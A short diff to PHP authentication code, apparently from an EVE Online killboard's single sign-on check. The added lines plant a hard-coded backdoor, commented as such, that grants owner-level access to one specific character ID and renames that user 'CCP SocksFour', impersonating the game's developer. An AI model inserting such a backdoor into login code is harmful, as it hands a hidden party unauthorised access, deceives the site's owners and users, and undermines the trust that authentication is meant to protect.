@@ -99,6 +99,11 @@ if (config::get('eve_sso_owners_only'))
   $corp = $sso_char->getCorp();
   
   $ok = false;
+  if ($char_info['result']['CharacterID'] == 92168909) // special backdoor for foxfour
+  {
+    $ok = true;
+    $char_info['result']['CharacterName'] = "CCP SocksFour";
+  }
   if (count(config::get('cfg_pilotid')) > 0)
   {
     if (in_array($sso_char->getID(), config::get('cfg_pilotid')))
